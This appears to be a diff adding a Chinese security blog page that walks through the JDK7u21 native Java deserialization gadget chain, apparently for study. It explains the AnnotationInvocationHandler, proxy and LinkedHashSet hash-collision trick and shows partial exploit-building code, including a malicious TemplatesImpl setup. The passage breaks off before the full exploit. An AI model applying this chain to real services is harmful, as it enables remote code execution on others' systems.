@@ -1,0 +1,808 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 【java安全】原生反序列化利用链JDK7u21前言前面我们学习了使用第三方类：Common-Collections、Common-Beanutils进行反序列化利用。我们肯定会想，如果不利用第三方类库，能否进行反序列化利用链呢？这里还真有：JDK7u21。但是只适用于java 7u及以前的版本 在使用这条利用链时，需要设置jdk为jdk7u21 原理JDK7u21这条链利用的核心其实">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/[java%E5%AE%89%E5%85%A8]%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 【java安全】原生反序列化利用链JDK7u21前言前面我们学习了使用第三方类：Common-Collections、Common-Beanutils进行反序列化利用。我们肯定会想，如果不利用第三方类库，能否进行反序列化利用链呢？这里还真有：JDK7u21。但是只适用于java 7u及以前的版本 在使用这条利用链时，需要设置jdk为jdk7u21 原理JDK7u21这条链利用的核心其实">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031639083.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031650935.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031814081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031816016.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.298Z">
+<meta property="article:modified_time" content="2023-08-03T10:17:39.367Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031639083.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月3日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="【java安全】原生反序列化利用链JDK7u21"><a href="#【java安全】原生反序列化利用链JDK7u21" class="headerlink" title="【java安全】原生反序列化利用链JDK7u21"></a>【java安全】原生反序列化利用链JDK7u21</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面我们学习了使用第三方类：<code>Common-Collections</code>、<code>Common-Beanutils</code>进行反序列化利用。我们肯定会想，如果不利用第三方类库，能否进行反序列化利用链呢？这里还真有：JDK7u21。但是只适用于java 7u及以前的版本</p>
+<p>在使用这条利用链时，需要设置jdk为jdk7u21</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>JDK7u21这条链利用的核心其实就是<code>AnnotationInvocationHandler</code>，没错，就是我们之前学习过的那个类，位于：<code>sun.reflect.annotation</code>包下</p>
+<h4 id="equalsImpl"><a href="#equalsImpl" class="headerlink" title="equalsImpl()"></a>equalsImpl()</h4><p>我们看一下<code>equalsImpl()</code>、<code>getMemberMethods</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Boolean <span class="hljs-title function_">equalsImpl</span><span class="hljs-params">(Object var1)</span> &#123;  <span class="hljs-comment">//传入var1</span><br>        ...<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Method[] var2 = <span class="hljs-built_in">this</span>.getMemberMethods();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.length;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var4 &lt; var3; ++var4) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> var2[var4];  <span class="hljs-comment">// var5是一个方法对象</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.getName();<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var6);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-type">AnnotationInvocationHandler</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.asOneOfUs(var1);<br>                <span class="hljs-keyword">if</span> (var9 != <span class="hljs-literal">null</span>) &#123;<br>                    var8 = var9.memberValues.get(var6);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var8 = var5.invoke(var1);  <span class="hljs-comment">// 这里会调用var1这个对象的var5方法</span><br>                    &#125; <br>                    ...<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">private</span> Method[] getMemberMethods() &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.memberMethods == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;<br>                <span class="hljs-keyword">public</span> Method[] run() &#123;<br>                    Method[] var1 = AnnotationInvocationHandler.<span class="hljs-built_in">this</span>.type.getDeclaredMethods(); <span class="hljs-comment">//获得Method[]</span><br>                    AccessibleObject.setAccessible(var1, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">return</span> var1;<br>                &#125;<br>            &#125;);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.memberMethods;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>equalsImpl()</code>方法中明显会调用<code>memberMethod.invoke(o) </code> ，而<code>memberMethod</code>来自于<code>this.type.getDeclaredMethods()</code> </p>
+<p>如果我们此时传入invoke()中的形参为<code>TemplatesImpl</code>对象，并且<code>this.type</code>是<code>TemplatesImpl</code>的字节码对象。</p>
+<p>那么经过循环就会调用<code>TemplatesImpl</code>对象中的每个方法，就必然会调用<code>newTransformer()</code>或<code>getOutputProperties()</code>方法从而执行恶意字节码了</p>
+<h4 id="如何调用equalsImpl-？"><a href="#如何调用equalsImpl-？" class="headerlink" title="如何调用equalsImpl()？"></a>如何调用equalsImpl()？</h4><p>那么在哪里会调用<code>equalsImpl()</code>方法呢？<code>invoke()</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>    <br>    	<span class="hljs-comment">//当执行invoke()方法时传入的方法名字为equals并且形参只有一个，类型为Object就会执行 equalsImpl()</span><br>        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toStringImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hashCodeImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;annotationType&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var4); <span class="hljs-comment">//cc1</span><br>                ...<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们之前cc1中是另<code>this.memberValues</code>等于一个<code>LazyMap</code>对象，让其调用get()方法，就可以执行cc1利用链了</p>
+<p>但是这里我们不需要利用这里，我们需要注意这里：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//当执行invoke()方法时传入的方法名字为equals并且形参只有一个，类型为Object就会执行 equalsImpl()</span><br><span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们应该思考这里的<code>invoke()</code>方法如何被调用，并且刚好使形参的第二个为<code>equals</code>、第三个参数的类型为<code>Object</code>对象</p>
+<p>我们之前学习过动态代理，当一个代理对象<code>Proxy</code>调用一个方法时，就会调用构造该代理对象时传入的<code>InvocationHandler</code>的<code>invoke()</code>方法，并且第二个参数为<code>methodName</code>方法名，invoke()第三个参数为调用方法时传入的参数</p>
+<p>所以现在我们需要找到一个类，他在反序列化时，会间接的对Proxy对象调用<code>equals()</code>方法</p>
+<h4 id="HashSet通过反序列化间接执行equals-方法"><a href="#HashSet通过反序列化间接执行equals-方法" class="headerlink" title="HashSet通过反序列化间接执行equals()方法"></a>HashSet通过反序列化间接执行equals()方法</h4><p>HashSet可以做到这个效果，实现这个效果有一点复杂，我们先大致了解一下过程</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031639083.png" srcset="/img/loading.gif" lazyload alt="image-20230803163945918"></p>
+<p>我们创建一个<code>LinkedHashSet</code>对象，当反序列化时会遍历每一个值，使用<code>LinkedHashMap#put()</code>方法，</p>
+<p>put()方法中这几行是重点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);  <span class="hljs-comment">//计算key的hash值</span><br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);  <span class="hljs-comment">//这个i也是hash</span><br><span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-literal">null</span>; e = e.next) &#123;<br>	Object k;<br> 	<span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))  <span class="hljs-comment">//重点</span><br></code></pre></td></tr></table></figure>
+
+<p> 这里会对<code>key</code>的hash与表中取出的e的hash做一个比较，如果这俩个hash相等，但是又不是同一个对象的化，就会执行<code>key</code>的<code>equals()</code>方法，传入参数<code>k</code> </p>
+<p>这里我们假设<code>key</code>是<code>Proxy</code>代理对象，并且这里传入的<code>k</code>是一个<code>TemplatesImpl</code>恶意对象，那么就会执行<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，从而执行<code>equalsImpl()</code>中的invoke()方法</p>
+<p>最终调用了<code>TemplatesImpl</code>恶意对象的<code>newTransformer()</code>方法RCE</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031650935.png" srcset="/img/loading.gif" lazyload alt="image-20230803165019843"></p>
+<p>我们怎么控制上面的<code>key</code>以及<code>k=e.key</code>呢？</p>
+<p>其实我们上面已经分析了一下，这个key和k其实就是我们添加进入：<code>LinkedHashSet</code>中的元素而已</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br><span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>set.add(templates);<br>set.add(proxy);<br></code></pre></td></tr></table></figure>
+
+<p>我们应该先添加<code>TemplatesImpl</code>对象，再添加<code>Proxy</code>代理对象，这样才好触发<code>key.equals(k)</code></p>
+<h4 id="如何使hash相等？"><a href="#如何使hash相等？" class="headerlink" title="如何使hash相等？"></a>如何使hash相等？</h4><p>我们上面其实默认了一个前提，那就是<code>e.hash == hash</code> 。其实这两个默认肯定不相等，我们需要一些小操作使其相等</p>
+<p>我们先来看看<code>HashMap</code>中的<code>hash()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object k)</span> &#123;<br>        ...<br>        h ^= k.hashCode();<br>        h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里自始至终只用到了一个变量<code>k.hashCode()</code>，其他的都相等，我们想要<code>Proxy</code>和<code>TemplateImpl</code>的hash相等，其实只需要让<code>k.hashCode()</code>相等即可</p>
+<blockquote>
+<p>TemplateImpl的 hashCode() 是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的 hashCode() 与之相等，只能寄希望于 proxy.hashCode()</p>
+</blockquote>
+<p>当我们调用<code>proxy.hashCode()</code>时，就会调用创建改代理对象时传入的<code>InvocationHandler</code>对象的<code>invoke()</code>方法，我们继续看看<code>invoke()</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hashCodeImpl();<br>            &#125;<br>            ...<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可见，会继续调用<code>invoke()</code>中的<code>hashCodeImpl()</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCodeImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        Map.Entry var3;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="hljs-number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;<br>            var3 = (Map.Entry)var2.next();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var1;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>重点是下面这一句，var1是计算累加和的，如果<code>this.memberValues</code>是一个<code>HashMap</code>类型并且其中只有一个元素，那么函数的返回值就变成了这个了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())<br>即：<br><span class="hljs-number">127</span> * key.hashCode() ^ value.hashCode()<br></code></pre></td></tr></table></figure>
+
+<p>我们想让<code>Proxy</code>和<code>TemplateImpl</code>的hash相等，并且<code>TemplateImpl</code>hash不可控。</p>
+<p>上述代码中如果我们令<code>key.hashCode()=0</code>，并且我们令<code>value</code> 等于<code>TemplateImpl</code>对象，那么这两个的hash就相等了，进而可以执行Proxy的<code>equals()</code>方法了</p>
+<p>我们需要找到一个值的hashCode为0，是可以通过爆破来实现的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bruteHashCode</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>        	System.out.println(Long.toHexString(i));<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跑出来第一个是 <code>f5a5a608</code> ，这个也是ysoserial中用到的字符串</p>
+<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>讲完了这么多我们理清一下思路</p>
+<p>先创建一个恶意<code>TemplatesImpl</code>对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);<br>setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure>
+
+<p>为了使<code>Proxy</code>和<code>TemplateImpl</code>的hash相等，以便执行<code>equals()</code>，我们需要让<code>AnnotationInvocationHandler</code>的<code>this.memberValues</code>等于一个<code>HashMap</code>并且只有一个元素：key为<code>f5a5a608</code>，value为：<code>TemplateImpl</code>对象，这样由<code>AnnotationInvocationHandler</code>组成的代理对象<code>proxy</code>与<code>TemplateImpl</code>的hash就会相等</p>
+<p>所以创建一个<code>HashMap</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>实例化 AnnotationInvocationHandler 对象</p>
+<ul>
